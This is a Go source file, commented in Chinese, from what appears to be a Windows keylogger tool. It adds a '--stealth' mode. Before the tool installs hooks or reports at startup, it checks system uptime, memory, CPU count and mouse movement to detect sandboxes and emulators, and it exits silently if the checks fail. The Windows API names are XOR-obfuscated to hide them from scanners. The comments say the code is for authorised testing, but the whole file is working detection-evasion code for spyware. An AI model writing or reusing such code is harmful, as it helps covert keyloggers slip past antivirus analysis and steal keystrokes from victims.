//go:build windows

package cmd

// 启动隐蔽模式(仅用于经授权的测试环境):
// --stealth 时,在启动上报、安装钩子等敏感动作之前,先执行反沙箱/反仿真
// 检查;所有检查通过才继续,超过 --delay 秒仍未通过则静默退出。
// 用于应对启发式引擎在"启动时"的拦截:仿真沙箱通常系统运行时间极短、
// 物理内存与 CPU 资源受限、无真实鼠标活动。
//
// 检查项(阈值可用 --stealth-uptime/--stealth-mem/--stealth-cpu 调整,
// 低配虚拟机靶机可适当调低,默认为真实物理机典型下限):
//   - 系统运行时间 ≥ 10 分钟(GetTickCount64)
//   - 物理内存 ≥ 4GB(GlobalMemoryStatusEx)
//   - 逻辑处理器 ≥ 2(GetSystemInfo)
//   - 鼠标位置发生变化(GetCursorPos 采样)——真实桌面必有,
//     锁屏/空闲机器给予 30 秒宽限,超时按通过处理(保证真实部署可用)
//
// 真实机器秒级通过;仿真环境各条件难以同时满足,将在 --delay 内
// 保持静默并最终退出,避免触发行为检测。

import (
	"os"
	"time"
	"unsafe"
)

var (
	stealthFlag  bool
	stealthDelay int
	stealthUpMin int // 最小系统运行时间(分钟)
	stealthMemGB int // 最小物理内存(GB)
	stealthCPUs  int // 最小逻辑处理器数
)

func init() {
	keylogger.Flags().BoolVar(&stealthFlag, "stealth", false,
		"启动隐蔽模式:通过反沙箱检查前不执行任何敏感动作(仅授权测试环境)")
	keylogger.Flags().IntVar(&stealthDelay, "delay", 300,
		"--stealth 模式下反沙箱检查的最长等待秒数,超时静默退出")
	keylogger.Flags().IntVar(&stealthUpMin, "stealth-uptime", 10,
		"反沙箱检查要求的系统最少运行分钟数")
	keylogger.Flags().IntVar(&stealthMemGB, "stealth-mem", 4,
		"反沙箱检查要求的最小物理内存(GB)")
	keylogger.Flags().IntVar(&stealthCPUs, "stealth-cpu", 2,
		"反沙箱检查要求的最小逻辑处理器数")
}

const mouseGrace = 30 * time.Second // 无鼠标活动的宽限时长

// stealthThresholds 归一化检查阈值:非法值(≤0)回退默认值
func stealthThresholds() (uptimeMin, memGB, cpus int) {
	uptimeMin, memGB, cpus = stealthUpMin, stealthMemGB, stealthCPUs
	if uptimeMin <= 0 {
		uptimeMin = 10
	}
	if memGB <= 0 {
		memGB = 4
	}
	if cpus <= 0 {
		cpus = 2
	}
	return
}

var (
	pTick64    uintptr
	pMemStat   uintptr
	pSysInfo   uintptr
	pCursorPos uintptr
)

func init() {
	pTick64 = procAddr(kernel32, x("\x20\x55\x18\x65\x07\x28\x58\x3a\x08\x45\x02\x45\x58\x7f"))
	pMemStat = procAddr(kernel32, x("\x20\x5c\x03\x53\x0f\x27\x7e\x1c\x0a\x5f\x1e\x48\x3d\x3f\x52\x0d\x12\x43\x29\x49"))
	pSysInfo = procAddr(kernel32, x("\x20\x55\x18\x62\x17\x38\x47\x1c\x0a\x79\x02\x57\x01"))
	pCursorPos = procAddr(user32, x("\x20\x55\x18\x72\x1b\x39\x40\x16\x15\x60\x03\x42"))
}

// sysUptimeMs 系统自启动以来的毫秒数
func sysUptimeMs() uint64 {
	r, _, _ := callProc(pTick64)
	return uint64(r)
}

// totalRAMBytes 物理内存总字节数
func totalRAMBytes() uint64 {
	var ms [64]byte // MEMORYSTATUSEX,dwLength 字段先行
	ms[0] = 64
	callProcDiscard(pMemStat, uintptr(unsafe.Pointer(&ms[0])))
	return *(*uint64)(unsafe.Pointer(&ms[8])) // ullTotalPhys
}

// cpuCount 逻辑处理器数量
func cpuCount() uint32 {
	var si [48]byte // SYSTEM_INFO(amd64 布局)
	callProcDiscard(pSysInfo, uintptr(unsafe.Pointer(&si[0])))
	return *(*uint32)(unsafe.Pointer(&si[32])) // dwNumberOfProcessors
}

// cursorPos 当前鼠标屏幕坐标
func cursorPos() (int32, int32) {
	var pt [8]byte // POINT
	callProcDiscard(pCursorPos, uintptr(unsafe.Pointer(&pt[0])))
	return *(*int32)(unsafe.Pointer(&pt[0])), *(*int32)(unsafe.Pointer(&pt[4]))
}

// stealthGate 反沙箱检查。返回 true 表示可以继续主流程;
// 返回 false 表示未通过,调用方应静默退出(不输出任何信息)。
func stealthGate() bool {
	if !stealthFlag {
		return true
	}
	if stealthDelay < 0 {
		stealthDelay = 0
	}
	deadline := time.Now().Add(time.Duration(stealthDelay) * time.Second)
	var waited time.Duration
	lastX, lastY := cursorPos()
	mouseMoved := false
	upMin, memGB, cpus := stealthThresholds()
	for {
		envOK := sysUptimeMs() >= uint64(upMin)*60000 &&
			totalRAMBytes() >= uint64(memGB)*1024*1024*1024 &&
			cpuCount() >= uint32(cpus)
		if x, y := cursorPos(); x != lastX || y != lastY {
			mouseMoved = true
			lastX, lastY = x, y
		}
		if envOK && (mouseMoved || waited >= mouseGrace) {
			return true
		}
		if time.Now().After(deadline) {
			return false
		}
		time.Sleep(time.Second)
		waited += time.Second
	}
}

// exitSilent 静默退出(不打印任何内容)
func exitSilent() {
	os.Exit(0)
}
